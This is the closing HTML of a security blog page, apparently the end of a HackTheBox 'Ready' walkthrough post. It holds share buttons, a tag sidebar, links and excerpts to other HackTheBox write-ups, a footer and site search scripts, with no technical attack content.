href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB - Ready - QTranspose&url=https://qtranspose.xyz/posts/htb-ready/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB - Ready - QTranspose&u=https://qtranspose.xyz/posts/htb-ready/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HTB - Ready - QTranspose&url=https://qtranspose.xyz/posts/htb-ready/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htb-time/">HTB - Time</a><li><a href="/posts/htb-bankrobber/">HTB - Bankrobber</a><li><a href="/posts/htb-bounty/">HTB - Bounty</a><li><a href="/posts/htb-forest/">HTB - Forest</a><li><a href="/posts/htb-optimum/">HTB - Optimum</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/oscp-prep/">OSCP Prep</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/metasploit/">Metasploit</a> <a class="post-tag" href="/tags/powershell/">PowerShell</a> <a class="post-tag" href="/tags/burp-suite/">Burp Suite</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/ssrf/">SSRF</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-bankrobber/"><div class="card-body"> <span class="timeago small" > Mar 11 <i class="unloaded">2021-03-11T00:00:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Bankrobber</h3><div class="text-muted small"><p> Bankrobber is a vulnerable virtual machine created by Gioo and Cneeliz on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-time/"><div class="card-body"> <span class="timeago small" > Apr 4 <i class="unloaded">2021-04-04T00:00:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Time</h3><div class="text-muted small"><p> Time is a vulnerable virtual machine created by egotisticalSW &amp; felamos on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-optimum/"><div class="card-body"> <span class="timeago small" > Nov 16, 2020 <i class="unloaded">2020-11-16T00:00:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Optimum</h3><div class="text-muted small"><p> Optimum is a vulnerable virtual machine created by ch4p on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-time/" class="btn btn-outline-primary" prompt="Older"><p>HTB - Time</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"></div><div class="footer-right"><p class="mb-0"> © 2021 <a href="https://github.com/QTranspose">QTranspose</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">All rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/oscp-prep/">OSCP Prep</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/metasploit/">Metasploit</a> <a class="post-tag" href="/tags/powershell/">PowerShell</a> <a class="post-tag" href="/tags/burp-suite/">Burp Suite</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/ssrf/">SSRF</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://qtranspose.xyz{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
